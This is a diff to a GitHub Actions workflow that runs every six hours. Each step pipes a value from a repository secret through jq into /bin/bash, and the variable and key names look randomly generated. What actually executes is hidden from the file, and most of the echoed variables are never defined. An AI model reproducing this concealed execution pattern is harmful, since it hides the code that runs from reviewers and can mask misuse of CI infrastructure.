@@ -1,9 +1,9 @@
 name: hongqizhngne
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 2/6 * * *'
-
+    - cron: '47 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,27 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: hongqizhngne
         env:
-          qrf66: ${{ secrets.qrf66 }}
+          qz45: ${{ secrets.qz45 }}
         run: |
-          echo $qrf66 | jq -r .xy38283 | /bin/bash
-          echo $nn0502 | jq -r .nvcma96656 | /bin/bash
-          echo $pqfzs78809 | jq -r .ywyd9668 | /bin/bash
-          echo $l52 | jq -r .jsnx64581 | /bin/bash
-          echo $equll4 | jq -r .vdqh14 | /bin/bash
-          echo $tjwz38 | jq -r .th1962 | /bin/bash
-          echo $rwy0239 | jq -r .wzv34967 | /bin/bash
-          echo $q556 | jq -r .l9018 | /bin/bash
-          echo $moa865 | jq -r .woebn73482 | /bin/bash
-          echo $zlv95799 | jq -r .ajjai89 | /bin/bash
-          echo $le95070 | jq -r .fgzvt7359 | /bin/bash
-          echo $dk935 | jq -r .ggaj5 | /bin/bash
-          echo $flp77 | jq -r .wmiq4 | /bin/bash
-          echo $fpjfe431 | jq -r .m38107 | /bin/bash
-          echo $s5472 | jq -r .gl838 | /bin/bash
-          echo $h20 | jq -r .sst17031 | /bin/bash
-          echo $cxfz04 | jq -r .kr705 | /bin/bash
-          echo $z364 | jq -r .z1 | /bin/bash
-          echo $dpd1 | jq -r .qcv809 | /bin/bash
-          echo $d876 | jq -r .nrvnh909 | /bin/bash
-          echo $n45716 | jq -r .owqp922 | /bin/bash
+          echo $qz45 | jq -r .fwr44627 | /bin/bash
+          echo $vxy6 | jq -r .d7 | /bin/bash
+          echo $f2 | jq -r .qrbf9 | /bin/bash
+          echo $wl155 | jq -r .clz5 | /bin/bash
+          echo $nupnq484 | jq -r .erli1 | /bin/bash
+          echo $gtli531 | jq -r .mchgq86821 | /bin/bash
+          echo $qgiv35496 | jq -r .qelm2 | /bin/bash
+          echo $jslu21139 | jq -r .cxupi5 | /bin/bash
+          echo $d5 | jq -r .lhsw1 | /bin/bash
+          echo $ntzwc81885 | jq -r .dm6 | /bin/bash
+          echo $lei23792 | jq -r .yyxro69793 | /bin/bash
+          echo $y9 | jq -r .b4 | /bin/bash
+          echo $tmw79 | jq -r .fox645 | /bin/bash
+          echo $wnpu7 | jq -r .r4 | /bin/bash
+          echo $j13350 | jq -r .umzcz7 | /bin/bash
+          echo $eiteh3078 | jq -r .orlga14 | /bin/bash
 
